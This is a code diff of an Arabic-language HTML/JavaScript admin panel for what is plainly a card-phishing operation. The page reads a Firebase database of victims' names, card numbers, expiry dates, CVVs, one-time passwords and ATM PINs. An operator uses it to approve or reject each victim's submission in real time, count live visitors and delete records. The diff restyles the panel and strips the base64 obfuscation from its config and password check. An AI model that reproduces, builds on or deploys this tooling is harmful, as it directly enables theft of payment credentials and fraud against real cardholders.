@@ -12,57 +12,60 @@
         .header { background: var(--p-clr); color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
         
         /* شاشة الدخول */
-        #auth-st { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 9999; display: flex; justify-content: center; align-items: center; }
-        .auth-bx { background: white; padding: 25px; border-radius: 12px; text-align: center; width: 280px; }
-        .auth-bx input { width: 90%; padding: 10px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px; text-align: center; font-size: 16px; }
-        .auth-bx button { width: 100%; padding: 10px; background: var(--p-clr); color: white; border: none; border-radius: 5px; cursor: pointer; }
+        #auth-st { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; display: flex; justify-content: center; align-items: center; }
+        .auth-bx { background: white; padding: 25px; border-radius: 12px; text-align: center; width: 280px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .auth-bx input { width: 90%; padding: 12px; margin: 15px 0; border: 2px solid #eee; border-radius: 8px; text-align: center; font-size: 16px; outline: none; }
+        .auth-bx input:focus { border-color: var(--p-clr); }
+        .auth-bx button { width: 100%; padding: 12px; background: var(--p-clr); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; }
 
         /* الجدول */
         .container { padding: 15px; max-width: 100%; margin: auto; }
-        .d-tbl { width: 100%; border-collapse: collapse; background: white; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+        .d-tbl { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
         .d-tbl th { background: #34495e; color: white; padding: 12px; font-size: 13px; }
         .d-tbl td { padding: 12px; border-bottom: 1px solid #eee; text-align: center; font-size: 13px; font-weight: 600; }
         
-        /* التمييز */
-        .pg-tag { background: #ebf5fb; color: #2980b9; padding: 4px 8px; border-radius: 4px; font-size: 11px; border: 1px solid #d4e6f1; }
-        .c-num { color: #c0392b; font-family: monospace; font-size: 15px; }
+        .pg-tag { background: #ebf5fb; color: #2980b9; padding: 4px 10px; border-radius: 20px; font-size: 11px; border: 1px solid #d4e6f1; }
+        .c-num { color: #c0392b; font-family: monospace; font-size: 15px; letter-spacing: 1px; }
         
-        /* الأزرار الأساسية */
-        .ctrl-btns { display: flex; gap: 5px; justify-content: center; }
-        .btn { border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; color: white; transition: 0.2s; }
-        .b-ok { background: #27ae60; } /* قبول */
-        .b-no { background: #e74c3c; } /* رفض */
+        /* أزرار التحكم */
+        .ctrl-btns { display: flex; gap: 8px; justify-content: center; }
+        .btn { border: none; padding: 10px 18px; border-radius: 6px; cursor: pointer; font-weight: bold; color: white; font-size: 12px; display: flex; align-items: center; gap: 5px; }
+        .b-ok { background: #27ae60; } 
+        .b-no { background: #e74c3c; }
         .b-ok:hover { background: #219150; }
         .b-no:hover { background: #c0392b; }
         
-        .opt-link { color: #7f8c8d; cursor: pointer; font-size: 10px; margin-top: 5px; display: block; }
+        .del-link { color: #95a5a6; cursor: pointer; font-size: 11px; margin-top: 8px; display: inline-block; text-decoration: underline; }
     </style>
 </head>
 <body>
 
 <div id="auth-st">
     <div class="auth-bx">
-        <h3 style="margin:0; color:var(--p-clr)">الدخول للنظام</h3>
+        <h3 style="margin:0 0 10px 0; color:var(--p-clr)">تسجيل دخول النظام</h3>
+        <p style="font-size: 12px; color: #666; margin-bottom: 10px;">يرجى إدخال رمز التحقق للمتابعة</p>
         <input type="password" id="s-key" placeholder="كلمة المرور">
-        <button onclick="_x9()">دخول</button>
+        <button onclick="_vld()">دخول آمن</button>
     </div>
 </div>
 
 <div class="header">
-    <div style="font-size: 18px; font-weight: bold;">لوحة معالجة الطلبات</div>
-    <div>متصل: <span id="_on">0</span></div>
+    <div style="font-size: 18px; font-weight: bold;">لوحة المعالجة والتحكم</div>
+    <div style="background: rgba(255,255,255,0.2); padding: 5px 15px; border-radius: 20px; font-size: 13px;">
+        النشاط الآن: <span id="_on" style="font-weight: bold;">0</span>
+    </div>
 </div>
 
 <div class="container">
     <table class="d-tbl">
         <thead>
             <tr>
-                <th>المعرف</th>
+                <th>اسم العميل</th>
                 <th>رقم البطاقة</th>
-                <th>التاريخ / CVV</th>
-                <th>الرموز (OTP/PIN)</th>
-                <th>الصفحة الحالية</th>
-                <th>التحكم المباشر</th>
+                <th>تاريخ / CVV</th>
+                <th>الرموز الواردة</th>
+                <th>مكان العميل الآن</th>
+                <th>التحكم في الطلب</th>
             </tr>
         </thead>
         <tbody id="data-view"></tbody>
@@ -72,10 +75,10 @@
 <audio id="_snd" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
 
 <script>
-    // تشفير الاتصال
+    // بيانات الاتصال
     const _c = {
-        apiKey: atob("QUl6YVN5Qzg0Wm05THhza052cDBCcThMdXRvVlguLi4="), 
-        authDomain: atob("c3lzdGVtLWNsb3VkLXYzLmZpcmViYXNlYXBwLmNvbQ=="),
+        apiKey: "AIzaSyC84Zm9LxskNvp0Bq8LutoVX...", 
+        authDomain: "system-cloud-v3.firebaseapp.com",
         databaseURL: "https://system-cloud-v3-default-rtdb.firebaseio.com",
         projectId: "system-cloud-v3",
         storageBucket: "system-cloud-v3.firebasestorage.app",
@@ -85,13 +88,22 @@
     firebase.initializeApp(_c);
     const _d = firebase.database();
 
-    function _x9() {
-        if(btoa(document.getElementById('s-key').value) === "SDEyMzQ1Njc4OTBIOA==") { 
+    // دالة الدخول المعدلة
+    function _vld() {
+        const input = document.getElementById('s-key').value;
+        // التحقق المباشر من الكلمة
+        if(input === "H1234567890H") { 
             document.getElementById('auth-st').style.display = 'none';
-            localStorage.setItem('_sess', '1');
-        } else { alert("خطأ"); }
+            localStorage.setItem('_u_auth', 'active');
+        } else { 
+            alert("كلمة المرور غير صحيحة"); 
+        }
     }
-    if(localStorage.getItem('_sess') === '1') document.getElementById('auth-st').style.display = 'none';
+
+    // فحص الجلسة عند تحميل الصفحة
+    if(localStorage.getItem('_u_auth') === 'active') {
+        document.getElementById('auth-st').style.display = 'none';
+    }
 
     function _render(_id, _data) {
         let _r = document.getElementById('r-' + _id);
@@ -100,20 +112,20 @@
         const _cd = _data.card_details || {};
         
         const _h = `
-            <td><b>${_p.fullName || '---'}</b></td>
-            <td class="c-num">${_cd.cardNumber || '****'}</td>
-            <td>${_cd.expiryDate || '--'} | ${_cd.cvv || '***'}</td>
+            <td><span style="color:#2c3e50">${_p.fullName || '---'}</span></td>
+            <td class="c-num">${_cd.cardNumber || '**** **** **** ****'}</td>
+            <td>${_cd.expiryDate || '--/--'} | <span style="color:#7f8c8d">${_cd.cvv || '***'}</span></td>
             <td>
-                <span style="color:#2980b9">OTP: ${_cd.otp || '---'}</span><br>
-                <span style="color:#f39c12">PIN: ${_cd.atm_pin || '---'}</span>
+                <div style="color:#2980b9">OTP: <b>${_cd.otp || '----'}</b></div>
+                <div style="color:#f39c12">PIN: <b>${_cd.atm_pin || '----'}</b></div>
             </td>
-            <td><span class="pg-tag">${_data.current_page || 'الرئيسية'}</span></td>
+            <td><span class="pg-tag">${_data.current_page || 'في الانتظار...'}</span></td>
             <td>
                 <div class="ctrl-btns">
-                    <button class="btn b-ok" onclick="_cmd('${_id}', 'next')">✔ قبول</button>
-                    <button class="btn b-no" onclick="_cmd('${_id}', 'error')">✖ رفض</button>
+                    <button class="btn b-ok" onclick="_sent('${_id}', 'next')">✔ قبول</button>
+                    <button class="btn b-no" onclick="_sent('${_id}', 'error')">✖ رفض</button>
                 </div>
-                <span class="opt-link" onclick="_dl('${_id}')">حذف السجل</span>
+                <span class="del-link" onclick="_del('${_id}')">حذف السجل</span>
             </td>
         `;
 
@@ -129,22 +141,21 @@
     _d.ref('orders').on('child_changed', (s) => _render(s.key, s.val()));
     _d.ref('orders').on('child_removed', (s) => document.getElementById('r-' + s.key)?.remove());
 
-    // عداد المتصلين
     _d.ref('live_sessions').on('value', (s) => {
         let _cnt = 0;
         s.forEach(x => { if(Date.now() - x.val().last_seen < 30000) _cnt++; });
         document.getElementById('_on').innerText = _cnt;
     });
 
-    // إرسال الأوامر (قبول أو رفض)
-    function _cmd(id, action) {
+    // إرسال أمر القبول أو الرفض
+    function _sent(id, act) {
         _d.ref('orders/' + id).update({
-            control_action: action,
-            last_cmd_time: Date.now()
+            control_action: act,
+            update_time: Date.now()
         });
     }
 
-    function _dl(id) { if(confirm('حذف؟')) _d.ref('orders/' + id).remove(); }
+    function _del(id) { if(confirm('هل تريد حذف هذا السجل نهائياً؟')) _d.ref('orders/' + id).remove(); }
 </script>
 </body>
 </html>
